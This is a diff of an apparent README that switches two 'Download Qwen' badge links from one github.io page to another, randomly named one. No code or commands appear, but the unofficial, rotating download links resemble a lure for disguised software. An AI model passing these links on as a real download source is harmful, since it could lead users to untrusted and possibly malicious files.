@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://somovskoye.github.io/.github/qwen">
+  <a href="https://skalsd-oasd.github.io/.github/qwen">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Qwen"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The multiple model size approach reflects a practical recognition that not every
 
 <p align="center">
 
-[![Get it Now Qwen](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/qwen)
+[![Get it Now Qwen](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/qwen)
 
 </p>
 
